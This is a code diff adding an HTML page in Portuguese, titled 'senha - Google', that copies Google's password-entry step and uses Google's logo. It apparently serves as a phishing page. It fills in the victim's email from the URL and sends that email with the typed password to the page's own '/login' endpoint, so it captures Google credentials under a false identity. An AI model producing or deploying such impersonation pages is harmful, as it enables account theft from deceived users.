@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+
+<head>
+  <meta charset="UTF-8">
+  <title>senha - Google</title>
+  <link rel="stylesheet" href="/css/senha.css">
+</head>
+
+<body>
+  <div class="container">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" class="logo"
+      alt="Google">
+    <h2>Olá!</h2>
+    <p><strong id="usuario-email">Carregando...</strong></p>
+
+    <!-- Formulário corrigido -->
+    <form action="/login" method="POST">
+      <!-- Campo oculto para enviar o email via POST -->
+      <input type="hidden" id="email" name="email">
+
+      <label for="senha">Digite sua senha</label><br>
+      <input type="password" id="senha" name="senha" required><br>
+      <a href="#" class="link">Esqueceu a senha?</a>
+      <button type="submit" class="botao_avançar">Avançar</button>
+    </form>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const email = params.get('email');
+    const emailTag = document.getElementById('usuario-email');
+    const hiddenEmail = document.getElementById('email');
+
+    if (email) {
+      emailTag.textContent = email;
+      hiddenEmail.value = email;
+    } else {
+      emailTag.textContent = 'Email não informado';
+    }
+  </script>
+</body>
+
+</html>
